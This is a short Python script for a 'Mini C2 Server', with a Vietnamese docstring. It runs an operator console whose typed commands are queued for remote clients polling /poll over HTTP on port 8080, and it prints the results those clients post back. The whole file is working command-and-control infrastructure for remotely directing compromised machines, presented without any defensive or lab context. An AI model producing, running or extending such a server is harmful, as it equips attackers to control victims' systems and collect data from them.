#!/usr/bin/env python3
"""
Mini C2 Server - Gửi msg cho client và nhận kết quả
"""

import http.server
import socketserver
import threading
import queue

HOST = "0.0.0.0"
PORT = 8080

msg_queue = queue.Queue()


class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_POST(self):
        print("[*] Client sending result...")
        
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode()
        
        print(f"\n[+] RESULT from client:")
        print("-" * 40)
        print(body)
        print("-" * 40)
        print("C2> ", end="", flush=True)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_GET(self):
        if self.path == "/poll":
            # print("[*] Client polling...")
            
            msg = None
            try:
                msg = msg_queue.get_nowait()
            except queue.Empty:
                pass
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(msg.encode() if msg else b"")


def main():
    print("=" * 50)
    print("  Mini C2 Server")
    print(f"  Listening on {HOST}:{PORT}")
    print("=" * 50)
    print()
    
    server = socketserver.TCPServer((HOST, PORT), C2Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    
    while True:
        try:
            cmd = input("C2> ")
            msg_queue.put(cmd)
        except (EOFError, KeyboardInterrupt):
            break


if __name__ == "__main__":
    main()
